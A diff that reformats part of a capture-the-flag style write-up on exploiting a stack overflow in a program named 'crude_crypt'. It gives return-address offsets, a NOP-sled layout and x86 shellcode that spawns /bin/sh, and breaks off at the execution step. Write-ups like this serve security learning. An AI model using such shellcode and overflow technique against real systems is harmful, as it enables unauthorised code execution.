@@ -64,13 +64,13 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 
 Ok, so we know we have control of eip and the stack. After checking that the stack is executable ($ readelf crude_crypt -a | grep GNU_STACK), which it is, we will place nop slide + shellcode in our input and overwrite eip with the address of the middle of the nop slide.
 
-Using gdb, we can determine that the host variable is located at 0xffffd5c0 and the return address is located at 0xffffd60c. If we provide a reasonable nop sled (32 bytes), this should bring the address of the middle of the nop sled to 0xffffd64c. It doesn't really matter what we use to fill the host variable before encryption, as long as there are no string terminators (I will be using "a"s). For fault tolerance, I will also be repeating the sled address 8 times, because teh return address is located 4 bytes from where the data starts.
+Using gdb, we can determine that the host variable is located at `0xffffd5c0` and the return address is located at `0xffffd60c`. If we provide a reasonable nop sled (32 bytes), this should bring the address of the middle of the nop sled to `0xffffd64c`. It doesn't really matter what we use to fill the host variable before encryption, as long as there are no string terminators (I will be using "a"s). For fault tolerance, I will also be repeating the sled address 8 times, because teh return address is located 4 bytes from where the data starts.
 
 ##### The structure of the exploit data will be:
-(sled address)\*8 + (\x90)\*128 + shellcode
+`(sled address)*8 + (\x90)*128 + shellcode`
 
 ##### Shellcode:
-\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
 
 ##### Executing the exploit:
 ```bash
